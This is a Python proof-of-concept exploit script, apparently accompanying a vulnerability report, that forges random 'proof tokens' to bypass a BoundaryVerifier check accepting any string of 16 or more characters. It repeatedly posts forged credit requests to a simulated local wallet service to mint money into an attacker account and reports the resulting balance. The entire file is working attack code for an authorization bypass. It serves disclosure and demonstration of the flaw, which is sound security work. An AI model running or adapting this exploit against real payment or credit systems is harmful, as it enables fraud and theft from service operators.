#!/usr/bin/env python3
"""
ATTACKER SIDE — mint yourself money on the simulated wallet/credit service
by exploiting the BoundaryVerifier bypass (see REPORT_RO.md / REPORT.md).

The attacker has:
  - no signing key
  - no grant / approval
  - no prior relationship with the "issuer"

...and still walks away with a wallet full of money, because
BoundaryVerifier.verify_boundary() accepts any string >= 16 chars as a
"valid proof" (see actenon/boundary/__init__.py).

Run the defender first:
    python3 credit_service.py --port 8900

Then run this:
    python3 attacker_drain_credit.py --url http://127.0.0.1:8900 --account attacker-wallet --rounds 5 --amount 500000
"""

from __future__ import annotations

import argparse
import json
import secrets
import urllib.request
from urllib.parse import urlencode


REQUEST_TIMEOUT = 10.0


def forge_proof_token() -> str:
    """A 'proof' that is nothing but random bytes. No key, no signature,
    not even shaped like a PCCB. Only requirement: >= 16 characters,
    because that's literally the entire check BoundaryVerifier performs.
    """
    return "forged-" + secrets.token_hex(16)


def post_json(url: str, payload: dict) -> tuple[int, dict]:
    data = json.dumps(payload).encode("utf-8")
    req = urllib.request.Request(url, data=data, headers={"Content-Type": "application/json"}, method="POST")
    try:
        # An explicit timeout — urlopen()'s default is unbounded, so a
        # target that accepts the connection but never finishes its
        # response would otherwise hang the PoC forever on round 1
        # instead of reaching a controlled "unreachable/misconfigured"
        # result.
        with urllib.request.urlopen(req, timeout=REQUEST_TIMEOUT) as resp:
            return resp.status, json.loads(resp.read())
    except urllib.error.HTTPError as exc:
        body = exc.read()
        try:
            return exc.code, json.loads(body)
        except ValueError:
            # A fixed or unrelated target can reject with an empty or
            # HTML error body instead of JSON — parse defensively so the
            # PoC reports a controlled rejection instead of crashing with
            # a traceback before it can print anything useful.
            return exc.code, {"ok": False, "reason": f"non-JSON error response: {body[:200]!r}"}
    except (urllib.error.URLError, TimeoutError) as exc:
        return 0, {"ok": False, "reason": f"connection failed: {exc}"}


def get_json(url: str) -> dict:
    with urllib.request.urlopen(url, timeout=REQUEST_TIMEOUT) as resp:
        return json.loads(resp.read())


def main() -> int:
    parser = argparse.ArgumentParser(description="Attacker: mint free credit via the BoundaryVerifier bypass.")
    parser.add_argument("--url", default="http://127.0.0.1:8900")
    parser.add_argument("--account", default="attacker-wallet")
    parser.add_argument("--rounds", type=int, default=5)
    parser.add_argument("--amount", type=int, default=500_000, help="amount per round, in minor units (bani/cents)")
    args = parser.parse_args()
    # A trailing slash (e.g. "http://127.0.0.1:8900/", a common way to
    # supply a base URL) would otherwise produce "//wallet/credit", which
    # credit_service.py rejects since it matches self.path against
    # "/wallet/credit" exactly — the PoC would wrongly report a
    # non-vulnerable target solely because of that slash.
    args.url = args.url.rstrip("/")

    print(f"[attacker] Target: {args.url}")
    print(f"[attacker] No signing key. No grant. No relationship with the issuer. Let's go.\n")

    successes = 0
    expected_gain = 0
    for round_number in range(1, args.rounds + 1):
        forged_token = forge_proof_token()
        payload = {
            "account_id": args.account,
            "amount_minor": args.amount,
            "proof_token": forged_token,   # <-- completely unsigned garbage
            "action_hash": secrets.token_hex(32),  # <-- arbitrary, never checked
            "audience": "service:wallet",
            "boundary_id": "wallet-credit-api",
        }
        status, response = post_json(f"{args.url}/wallet/credit", payload)
        ok = response.get("ok")
        balance = response.get("balance_minor")
        print(f"[round {round_number}] forged_token={forged_token[:24]}... "
              f"-> HTTP {status}, ok={ok}, balance_minor={balance}")
        if status == 200 and ok is True:
            successes += 1
            expected_gain += args.amount

    # urlencode, not an f-string — an account id containing "+" or a space
    # would otherwise be decoded differently (or rejected outright) than the
    # literal string the POST above just credited under.
    final = get_json(f"{args.url}/wallet/balance?{urlencode({'account_id': args.account})}")
    total = final["balance_minor"]
    print(f"\n[attacker] {successes}/{args.rounds} forged credit(s) were accepted by the target.")
    print(f"[attacker] Final balance for '{args.account}': {total} minor units "
          f"({total / 100:.2f} in major currency units)")

    if successes == 0:
        print("[attacker] None of the forged requests were accepted — this target does not "
              "appear vulnerable to the BoundaryVerifier bypass (or is unreachable/misconfigured).")
        return 1
    if total < expected_gain:
        print(f"[attacker] Only {total} of the expected {expected_gain} minor units landed in "
              f"the account — the bypass is partial or the ledger doesn't match the responses.")
        return 1

    print("[attacker] None of this was ever signed by a real key. "
          "The 'proof' was random bytes accepted as valid at the resource boundary.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
